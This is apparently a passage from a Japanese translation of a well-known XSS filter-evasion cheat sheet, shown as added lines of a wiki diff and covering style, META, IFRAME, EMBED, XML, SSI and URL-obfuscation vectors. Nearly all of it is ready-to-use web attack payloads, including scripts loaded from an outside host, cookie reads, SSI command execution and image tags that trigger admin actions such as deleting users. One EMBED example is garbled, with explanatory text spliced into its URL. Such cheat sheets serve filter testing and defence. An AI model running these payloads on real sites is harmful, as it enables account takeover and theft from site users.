+<p>(リモートスタイルシートなど簡単なものを利用することで、XSS を組み込み、style パラメーターを埋め込まれた式を使用して再定義できます。)これは、IE および IE レンダリングエンジンモードの  Netscape 8.1 以降でのみ動作します。ページ上に JavaScript が組み込まれていることを示すものは何も存在しないことに注意してください。注: これらすべてのリモートスタイルシートの例では、body タグが使用されています。そのためベクトル自体の他に、コンテンツがページ上にないと動作しません。何もコンテンツがない空白のページの場合は、動作させるために、1 文字でもページに追加する必要があります。
+</p>
+<pre>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="Remote_style_sheet_part_2">リモートスタイルシート パート 2</span></h2>
+<p>前述と同じように動作しますが、&lt;LINK&gt; タグではなく、&lt;STYLE&gt; タグを使用します。このベクトルのわずかなバリエーションを使用して、Google デスクトップがハッキングされました。ベクトルの直後に HTML がありタグが閉じられている場合、&lt;/STYLE&gt; の終了タグを除去できることを参考までに述べておきます。クロスサイトスクリプティング攻撃で、等号やスラッシュを保有できない場合に役立ちます。このようなケースは誰もが一度は経験するはずです。
+</p>
+<pre>&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;
+</pre>
+<h2><span class="mw-headline" id="Remote_style_sheet_part_3">リモートスタイルシート パート 3</span></h2>
+<p>これは、Opera 8.0 のみで動作しますが (9.x では動作しません)、かなり巧妙にできています。RFC2616 によれば、リンクヘッダーの設定は、HTTP1.1 の仕様にはありませんが、一部のブラウザーでは依然として許可されています (Firefox および Operaなど)。この場合のトリックは、ヘッダーを設定し (基本的には、Link:&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet のような HTTP ヘッダーと変わりません) 、クロスサイトスクリプティングベクトルを持つリモートスタイルシートが JavaScript を実行します。これは、FireFox でサポートされていません。
+</p>
+<pre>&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="Remote_style_sheet_part_4">リモートスタイルシート パート 4</span></h2>
+<p>これは Gecko レンダリングエンジンでのみ動作し、XUL ファイルを親ページにバインドすることで機能します。Netscape では、Gecko がより安全との前提に立っています。そのため、大半のサイトがこれに対して脆弱になっているという皮肉な結果があります。
+</p>
+<pre>&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;
+</pre>
+<h2><span class="mw-headline" id="STYLE_tags_with_broken_up_JavaScript_for_XSS">XSS で JavaScript を中断する STYLE タグ</span></h2>
+<p>この XSS は、適時 IE をアラートの無限ループに送ります。
+</p>
+<pre>&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert(&quot;XSS&quot;)';&lt;/STYLE&gt;
+</pre>
+<h2><span class="mw-headline" id="STYLE_attribute_using_a_comment_to_break_up_expression">コメントを使用して式を中断する STYLE 属性</span></h2>
+<p>Roman Ivanov によって作成 
+</p>
+<pre>&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert('XSS'))&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="IMG_STYLE_with_expression">式付きの IMG STYLE </span></h2>
+<p>これは、実際には前述の XSS ベクトルのハイブリッド版ですが、STYLE タグの解析がどれほど難しいかを示しています。上記と同様に、IE をループに送ることができます。
+</p>
+<pre>exp/*&lt;A STYLE='no\xss:noxss(&quot;*//*&quot;);
+xss:&#101;x&#x2f;*XSS*//*/*/pression(alert(&quot;XSS&quot;))'&gt;
+</pre>
+<h2><span class="mw-headline" id="STYLE_tag_.28Older_versions_of_Netscape_only.29">STYLE タグ (旧バージョンの Netscape のみ)</span></h2>
+<pre>&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert('XSS');&lt;/STYLE&gt;
+</pre>
+<h2><span class="mw-headline" id="STYLE_tag_using_background-image">background-image を使用する STYLE タグ</span></h2>
+<pre>&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+</pre>
+<h2><span class="mw-headline" id="STYLE_tag_using_background">background を使用する STYLE タグ</span></h2>
+<pre>&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert('XSS')&quot;)}&lt;/STYLE&gt;
+</pre>
+<p>&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;
+</p>
+<h2><span class="mw-headline" id="Anonymous_HTML_with_STYLE_attribute">STYLE 属性を持つ匿名 HTML</span></h2>
+<p>IE6.0 および IE レンダリングエンジンモードの Netscape 8.1 以降では、左不等号括弧と 1 文字で始まる限り、作成した HTML タグが存在してもしなくても関係ありません。
+</p>
+<pre>&lt;XSS STYLE=&quot;xss:expression(alert('XSS'))&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="Local_htc_file">ローカル htc ファイル</span></h2>
+<p>XSS ベクトルと同じサーバーに存在しなければならない .htc ファイルを使用するため、上記の 2 つのクロスサイトスクリプティングのベクトルとは少し違います。例のファイルは、JavaScript を取り込んで、STYLE 属性の一部として実行することによって動作します。
+</p>
+<pre>&lt;XSS STYLE="behavior: url(xss.htc);"&gt;
+</pre>
+<h2><span class="mw-headline" id="US-ASCII_encoding">US-ASCII エンコード</span></h2>
+<p>US-ASCII エンコードです (Kurt Huwig によって発見されました)。これは、8 ビットではなく 7 ビットを使用した、誤った形式の ASCII エンコードを使用します。この XSS は、多くのコンテンツフィルターをバイパスできますが、ホストが US-ASCII エンコードで送信する場合、またはユーザーが自分でエンコードを設定した場合にのみ動作します。サーバー側のフィルター回避よりも、Web アプリケーションファイアウォールのクロスサイトスクリプティング回避に対して、より有効です。US-ASCII エンコードで送信するサーバーとして知られているのは、Apache Tomcat のみです。 
+</p>
+<pre>¼script¾alert(¢XSS¢)¼/script¾
+</pre>
+<h2><span class="mw-headline" id="META">META</span></h2>
+<p>メタ更新について興味深いのは、ヘッダーでリファラーを送信しないことです。そのため、参照 URL を除去しなければならない攻撃のタイプに使用できます。
+</p>
+<pre>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert('XSS');&quot;&gt;
+</pre>
+<h3><span class="mw-headline" id="META_using_data">データを使用する META</span></h3>
+<p>ディレクティブ URL スキーム。SCRIPT という単語や JavaScript ディレクティブを持つものを明示的に何も保有せずに、base64 エンコードを活用するため、これは優れています。詳しくは <a class="external mw-magiclink-rfc" rel="nofollow" href="//tools.ietf.org/html/rfc2397">RFC 2397</a> を参照してください。あるいは、ここを確認してエンコードを行ってください。単に生 HTML または JavaScript のエンコードなら、以下の XSS <a rel="nofollow" class="external text" href="http://ha.ckers.org/xsscalc.html">計算機能</a>も使用できます。これは、Base64 エンコードメソッドを使用しています。
+</p>
+<pre>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;
+</pre>
+<h3><span class="mw-headline" id="META_with_additional_URL_parameter">追加 URL パラメーターを持つ META</span></h3>
+<p>ターゲットの Web サイトが、URL の先頭に "http://" が含まれているかどうかを確認しようとしている場合、以下の手法で回避できます (Moritz Naumann による投稿)。
+</p>
+<pre>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert('XSS');&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="IFRAME">IFRAME</span></h2>
+<p>iframes が許可されている場合、多くのその他の XSS の問題があります。
+</p>
+<pre>&lt;IFRAME SRC=&quot;javascript:alert('XSS');&quot;&gt;&lt;/IFRAME&gt;
+</pre>
+<h2><span class="mw-headline" id="IFRAME_Event_based">IFRAME イベントベース</span></h2>
+<p>IFrames とその他の大半の要素は、次のようなイベントベースの破壊を使用できます...  
+(投稿者: David Cross)
+</p>
+<pre>&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt;
+</pre>
+<h2><span class="mw-headline" id="FRAME">FRAME</span></h2>
+<p>Frame には、iframe と同じ種類の XSS の問題があります。
+</p>
+<pre>&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert('XSS');&quot;&gt;&lt;/FRAMESET&gt;
+</pre>
+<p><br />
+</p>
+<h2><span class="mw-headline" id="TABLE">TABLE</span></h2>
+<pre>&lt;TABLE BACKGROUND=&quot;javascript:alert('XSS')&quot;&gt;
+</pre>
+<h3><span class="mw-headline" id="TD">TD</span></h3>
+<p>上記のように、TD は、JavaScript XSS ベクトルを含む BACKGROUND に対して脆弱です。
+</p>
+<pre>&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert('XSS')&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="DIV">DIV</span></h2>
+<h3><span class="mw-headline" id="DIV_background-image">DIV background-image</span></h3>
+<pre>&lt;DIV STYLE=&quot;background-image: url(javascript:alert('XSS'))&quot;&gt;
+</pre>
+<h3><span class="mw-headline" id="DIV_background-image_with_unicoded_XSS_exploit">unicode 化した XSS エクスプロイトを持つ DIV background-image</span></h3>
+<p>これは、url パラメーターを難読化するために若干修正されました。元々の脆弱性は、Hotmail における脆弱性として、Renaud Lifchitz によって発見されました。
+</p>
+<pre>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;
+</pre>
+<h3><span class="mw-headline" id="DIV_background-image_plus_extra_characters">DIV background-image と追加文字</span></h3>
+<p>Rnaske は、セキュアサイトモードの IE および Netscape 8.1 で、開き括弧の後、JavaScript ディレクティブの前に許可されている、エラーのある文字を検出するために、迅速な XSS ファザーを作成しました。これらは 10 進数ですが、16 進数を含めることも、埋め込みを追加することもできます。(次の文字が使用可能: 1-32、34、39、160、8192-8.13、12288、65279):
+</p>
+<pre>&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert('XSS'))&quot;&gt;
+</pre>
+<h3><span class="mw-headline" id="DIV_expression">DIV 式</span></h3>
+<p>これのバリアントは、コロンと "expression" の間で改行を使用する、実際のクロスサイトスクリプティングに対して有効です。
+</p>
+<pre>&lt;DIV STYLE=&quot;width: expression(alert('XSS'));&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="Downlevel-Hidden_block">Downlevel-Hidden ブロック</span></h2>
+<p>IE5.0 以降、および IE レンダリングエンジンモードの Netscape 8.1 でのみ動作します。一部の Web サイトでは、コメントブロック内の記述は安全と見なされ、除去する必要はないとしています。これによって、クロスサイトスクリプティングのベクトルが可能になります。あるいは、システムが周囲にコメントタグを追加して、無害にするためにレンダリングしようとする場合もあります。以下のように、これはうまくいきません。
+</p>
+<pre>&lt;!--[if gte IE 4]&gt;
+ &lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
+ &lt;![endif]--&gt;
+</pre>
+<h2><span class="mw-headline" id="BASE_tag">BASE タグ</span></h2>
+<p>IE およびセーフモードの Netscape 8.1 で動作します。次の文字をコメント化するには、// が必要です。JavaScript エラーは発生せず、XSS タグはレンダリングされます。また、これは、Webサイトが、絶対パスではなく動的に配置されたイメージ (images/image.jpg など) を使用しているかどうかに依存しています。パスの先頭に、"/images/image.jpg" のようにスラッシュが含まれている場合、このベクトルからスラッシュを 1 つ除去できます (コメントの先頭としてスラッシュが 2 つ存在するだけで動作します)。
+</p>
+<pre>&lt;BASE HREF=&quot;javascript:alert('XSS');//&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="OBJECT_tag">OBJECT タグ</span></h2>
+<p>オブジェクトが許可されている場合、ウィルスペイロードを挿入して、ユーザーに感染させることもできます。APPLET タグと同様です。リンクされたファイルは、実際には HTML ファイルで、XSS を含むことができます。
+</p>
+<pre> &lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;
+</pre>
+<h2><span class="mw-headline" id="Using_an_EMBED_tag_you_can_embed_a_Flash_movie_that_contains_XSS">XSS を含む Flash 動画を埋め込むことができる EMBED タグの使用</span></h2>
+<p>ここをクリックしてデモを開始します。allowScriptAccess="never" 属性および allownetworking="internal" 属性を追加すると、このリスクが軽減されます (この情報について Jonathan Vanasco に謝意を表します)。
+</p>
+<pre>EMBED SRC=&quot;http://ha.ckers。XSS を含む Flash 動画を埋め込むことができる EMBED タグの使用。ここをクリックしてデモを開始します。allowScriptAccess=&quot;never&quot; 属性および allownetworking=&quot;internal&quot; 属性を追加すると、このリスクが軽減されます (この情報について Jonathan Vanasco に謝意を表します)。org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;
+</pre>
+<h2><span class="mw-headline" id="You_can_EMBED_SVG_which_can_contain_your_XSS_vector">XSS ベクトルを含むことができる SVG の埋め込み</span></h2>
+<p>この例は、Firefox でしか動作しません。しかし、ユーザーが Flash をオンにしたり、インストールしたりする必要がないため、Firefox では上記のベクトルよりも優れています。本件について、nEUrOO に謝意を表します。
+</p>
+<pre>&lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;
+</pre>
+<h2><span class="mw-headline" id="Using_ActionScript_inside_flash_can_obfuscate_your_XSS_vector">Flash 内で ActionScript を使用して XSS ベクトルを難読化する</span></h2>
+<pre>a=&quot;get&quot;;
+b=&quot;URL(\&quot;&quot;;
+c=&quot;javascript:&quot;;
+d=&quot;alert('XSS');\&quot;)&quot;;
+eval(a+b+c+d);
+</pre>
+<h2><span class="mw-headline" id="XML_data_island_with_CDATA_obfuscation">CDATA 難読化による XML データアイランド</span></h2>
+<p>この XSS 攻撃は、IE および IE レンダリングエンジンモードの Netscape 8.1 でのみ動作します。このベクトルは、Yahoo の監査時に、セキュリティコンサルタントによって発見されました。
+</p>
+<pre>&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert('XSS')&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;
+</pre>
+<h2><span class="mw-headline" id="Locally_hosted_XML_with_embedded_JavaScript_that_is_generated_using_an_XML_data_island">ローカルにホストされた XML に XML データアイランドを使用して生成された JavaScript を埋め込む </span></h2>
+<p>これは、上記と同じですが、ローカルにホストされた (同じサーバー上に存在しなければならない) XML ファイルを参照し、そのファイルにクロスサイトスクリプティングベクトルが含まれています。結果はこのようになります。
+</p>
+<pre>&lt;XML SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+</pre>
+<h2><span class="mw-headline" id="HTML.2BTIME_in_XML">XML での HTML+TIME</span></h2>
+<p>これは、Grey Magic が Hotmail と Yahoo! をハッキングした手法です。 これは、Internet Explorer と IE レンダリングエンジンモードの Netscape 8.1 でのみ動作します。また、動作するには HTML および BODY タグ間に配置しなければなりません。
+</p>
+<pre>&lt;HTML&gt;&lt;BODY&gt;
+&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;
+&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;
+&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+</pre>
+<p><br />
+</p>
+<h2><span class="mw-headline" id="Assuming_you_can_only_fit_in_a_few_characters_and_it_filters_against_.22.js.22">数文字しか挿入できず、".js" に対してフィルターする場合</span></h2>
+<p>JavaScript ファイルを XSS ベクトルとしてのイメージに名前変更できます。
+</p>
+<pre>&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
+</pre>
+<p><br />
+</p>
+<h2><span class="mw-headline" id="SSI_.28Server_Side_Includes.29">SSI (サーバーサイドインクルード)</span></h2>
+<p>この XSS ベクトルを使用するためには、SSI がサーバーにインストールされていなければなりません。言うまでもないことですが、サーバーでコマンドを実行できる場合、問題はより深刻になります。
+</p>
+<pre>&lt;!--#exec cmd=&quot;/bin/echo '&lt;SCR'&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;'&quot;--&gt;
+</pre>
+<p><br />
+</p>
+<h2><span class="mw-headline" id="PHP">PHP</span></h2>
+<p>この XSS ベクトルを使用するためには、PHP がサーバーにインストールされていなければなりません。同様に、このようにスクリプトをリモートで実行できる場合、問題はより重大になります。
+</p>
+<pre>&lt;? echo('&lt;SCR)';
+echo('IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;'); ?&gt;
+</pre>
+<p><br />
+</p>
+<h2><span class="mw-headline" id="IMG_Embedded_commands">IMG 埋め込みコマンド</span></h2>
+<p>これは、挿入された Web ページ (Web ボードなど) がパスワード保護の背後にあり、そのパスワード保護が同じドメイン上の別のコマンドで動作する場合に動作します。これを使用して、ユーザーの削除、追加 (ページにアクセスしたユーザーが管理者の場合)、資格情報の他の場所への送信などを行うことができます。使用される頻度は多くありませんが、有効な XSS ベクトルです。
+</p>
+<pre>&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
+</pre>
+<p><br />
+</p>
+<h3><span class="mw-headline" id="IMG_Embedded_commands_part_II">IMG 埋め込みコマンド パート 2</span></h3>
+<p>ユーザー自身のドメイン上でホストされていないことを除けば、疑わしく見える部分がないため、より怖いベクトルです。このベクトルは、302 または 304 (他も動作します) を使用して、イメージをコマンドにリダイレクトして戻します。そのため実際には通常の &lt;IMG SRC="<img src="http://badguy.com/a.jpg" alt="a.jpg" />"&gt; が、攻撃ベクトルになり、イメージリンクを表示しているユーザーとして、コマンドを実行します。このベクトルを達成するために .htaccess (Apache 下) 行があります (この部分について Timo に謝意を表します)。
+</p>
+<pre>Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
+</pre>
+<p><br />
+</p>
+<h2><span class="mw-headline" id="Cookie_manipulation">Cookie の操作</span></h2>
+<p>比較的目立ちませんが、&lt;META が許可され、それを使用して Cookie を上書きできる例がいくつかあります。データベースからユーザー名を取得するのではなく、ページにアクセスするユーザーにのみ表示される Cookie 内にユーザー名が格納されているサイトの例があります。これらの 2 つのシナリオを組み合わせて、被害者の Cookie を変更し、被害者に JavaScript として表示することができます (これを使用して、ユーザーをログアウトさせたり、ユーザーの状態を変更したり、ログインさせたりすることもできます)。
+</p>
+<pre>&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="UTF-7_encoding">UTF-7 エンコード</span></h2>
+<p>XSS が存在するページがページ charset ヘッダーを指定していない場合、または UTF-7 エンコードに設定されているブラウザーが以下によって攻略されている場合 (この部分について Roman Ivanov に謝意を表します)。例は、ここをクリックしてください (ユーザーのブラウザーが auto-detect に設定され、IE および IE レンダリングエンジンモードの Netscape 8.1 で、ページにオーバーライドする content-types がない場合は、charset ステートメントは必要ありません)。エンコードタイプを変更しない限り、最新のブラウザーでは動作しません。サポートされないのはエンコードタイプの変更が必要なためです。Watchfire が Google のカスタム 404 スクリプトでこのセキュリティホールを見つけました。 
+</p>
+<pre> &lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+</pre>
+<h2><span class="mw-headline" id="XSS_using_HTML_quote_encapsulation">HTML 引用符のカプセル化を使用した XSS</span></h2>
+<p>これは、IE でテスト済みで、利用価値は多彩です。regex フィルター "/&lt;script[^&gt;]+src/i" を経由して、"&lt;SCRIPT&gt;" を許可するが "&lt;SCRIPT SRC..." を許可しないサイトで XSS を実行します。
+</p>
+<pre>&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+</pre>
+<p>regex フィルター "/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i" (この正規表現は実際に見たことがあるため、重要です) を経由して、"&lt;SCRIPT&gt;" を許可するが "&lt;SCRIPT SRC..." を許可しないサイトで XSS を実行します。
+</p>
+<pre>&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+</pre>
+<p>同じフィルターを回避する別の XSS。"/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i":
+</p>
+<pre>&lt;SCRIPT a=&quot;&gt;&quot; '' SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+</pre>
+<p>同じフィルターを回避する別の XSS。"/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i"。軽減策を議論するつもりはないと言いましたが、&lt;SCRIPT&gt; タグを許可したいが、リモートスクリプトを許可したくない場合に、この XSS の例で動作するのは、ステートマシンのみです (もちろん&lt;SCRIPT&gt;  タグを許可する場合、これを回避する方法は他にもあります)。
+</p>
+<pre>&lt;SCRIPT &quot;a='&gt;'&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+</pre>
+<p>回避するべき最後の XSS 攻撃。"/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i" using grave accents (これも Firefox では動作しません):
+</p>
+<pre>&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+</pre>
+<p>この XSS の例は、regex が合致する引用符のペアを取得せず、不適切にパラメーター文字列を終了する引用符を検出するという事実に基づいています。
+</p>
+<pre>&lt;SCRIPT a=&quot;&gt;'&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+</pre>
+<p>この XSS は、依然として厄介です。すべてのアクティブなコンテンツをブロックしない限り、停止するのはほぼ困難なためです。
+</p>
+<pre>&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+</pre>
+<h2><span class="mw-headline" id="URL_string_evasion">URL 文字列回避</span></h2>
+<p>"<a rel="nofollow" class="external free" href="http://www.google.com/">http://www.google.com/</a>" はプログラム的に許可されないというのが前提です。
+</p>
+<h3><span class="mw-headline" id="IP_verses_hostname">IP によるホスト名の作成</span></h3>
+<pre>&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
+</pre>
+<h3><span class="mw-headline" id="URL_encoding">URL エンコード</span></h3>
+<pre>&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
+</pre>
+<h3><span class="mw-headline" id="Dword_encoding">Dword エンコード</span></h3>
+<p>(注: 他にも Dword エンコードのバリエーションがあります。詳しくは、以下の IP 難読化計算機能を参照してください)。
+</p>
+<pre>&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
+</pre>
+<h3><span class="mw-headline" id="Hex_encoding">Hex エンコード</span></h3>
+<p>許可される各数字の合計サイズは、2 番目の数字で確認できるとおり合計 240 文字あたりで、16 進数は 0 から F までの値であるため、3 番目の 16 進 quotet の先頭のゼロは必要ありません。
+</p>
+<pre>&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
+</pre>
+<h3><span class="mw-headline" id="Octal_encoding">Octal エンコード</span></h3>
+<p>埋め込みが許可されます。ただし、クラス A、クラス B のように、クラスごとに合計 4 文字を超える文字を維持する必要があります。
+</p>
+<pre>&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;
+</pre>
+<h3><span class="mw-headline" id="Mixed_encoding">混合エンコード</span></h3>
+<p>基本エンコードを混合し、合致させ、タブと改行の一部を挿入します。ブラウザーがなぜこれを許可するかは不明です。タブと改行は、引用符でカプセル化されている場合にのみ機能します。
+</p>
+<pre>&lt;A HREF=&quot;h
+tt	p://6&#9;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
+</pre>
+<h3><span class="mw-headline" id="Protocol_resolution_bypass">プロトコル解決のバイパス</span></h3>
+<p>(// を http:// に変換します。数バイト多く節約できます)。スペースが問題になる場合にも役立ちます (2 文字少ないことが役立ちます)。また "(ht|f)tp(s)?://" など、正規表現を容易にバイパスできます。(この部分について、Ozh に謝意を表します)。"//" を "\\" に変更することもできます。スラッシュは適切な場所に配置しなければなりません。そうでないと、相対パス URL として解釈されます。
+</p>
+<pre>&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
+</pre>
+<h3><span class="mw-headline" id="Google_.22feeling_lucky.22_part_1.">Google "feeling lucky" パート 1</span></h3>
+<p>Firefox は、Google's "feeling lucky" 機能を使用して、ユーザーを入力したキーワードにリダイレクトします。そのため、ここで示すように攻略可能なページがランダムキーワードで最初のページであった場合、あらゆる Firefox ユーザーに対してこの機能を使用することができます。これは Firefox の "keyword:" プロトコルを使用します。例えば、次の "keyword:XSS+RSnake" のように使用することで、いくつかのキーワードを連結できます。これは、Firefox のバージョン 2.0 では動作しません。 
+</p>
+<pre>&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
+</pre>
+<h3><span class="mw-headline" id="Google_.22feeling_lucky.22_part_2.">Google "feeling lucky" パート 2</span></h3>
+<p>これは極めて小さなトリックを使用します。"feeling lucky" 機能を実装する場合に限られるので、Firefox でのみ動作すると思われます。次とは異なり、Opera では動作しません。Opera は、古い HTTP 基本認証フィッシング攻撃と認識するためです (そうではありませんが)。これは単なる誤った形式の URL です。ダイアログで [OK] をクリックすると動作しますが、エラーのあるダイアログボックスであるため、Opera ではサポートされておらず、Firefox のバージョン 2.0 でもサポートされなていないと述べておきます。
+</p>
+<pre>&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;
+</pre>
+<h3><span class="mw-headline" id="Google_.22feeling_lucky.22_part_3.">Google "feeling lucky" パート 3</span></h3>
+<p>これは誤った形式の URL を使用します。"feeling lucky" 機能を実装する場合に限られるので、Firefox と Opera でのみ動作すると思われます。前述のすべての場合と同様に、該当キーワード (この場合は、「google」) の Google 検索で検索結果のトップに表示されなければなりません。
+</p>
+<pre>&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;
+</pre>
+<h3><span class="mw-headline" id="Removing_cnames">cnames の除去</span></h3>
+<p>上記の URL と組み合わせると、"www." を除去することで、4 バイト節約でき、これが適切にセットアップされているサーバーでは合計 9 バイト節約できます。
+</p>
+<pre>&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
+</pre>
+<h3><span class="mw-headline" id="Extra_dot_for_absolute_DNS:">絶対 DNS の追加ドット:</span></h3>
+<pre>&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
+</pre>
+<h3><span class="mw-headline" id="JavaScript_link_location:">JavaScript リンクロケーション:</span></h3>
+<pre>&lt;A HREF=&quot;javascript:document.location='http://www.google.com/'&quot;&gt;XSS&lt;/A&gt;
+</pre>
+<h3><span class="mw-headline" id="Content_replace_as_attack_vector">攻撃ベクトルとしてのコンテンツ置換</span></h3>
+<p>"<a rel="nofollow" class="external free" href="http://www.google.com/">http://www.google.com/</a>" をプログラム的に置き換えることはできないというのが前提です。変換フィルター自体 (ここに例を挙げます) を使用して攻撃ベクトルを作成することによって、分離された実際の XSS フィルターに対して同様の攻撃ベクトルを使用しました(IE: "java&#x09;script:" は、IE、セキュアサイトモードの Netscape 8.1 以降、Opera では "java	script:" に変換され、レンダリングされました)。
+</p>
+pre>&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
+</pre>
+<h2><span class="mw-headline" id="Character_escape_sequences">文字エスケープシーケンス</span></h2>
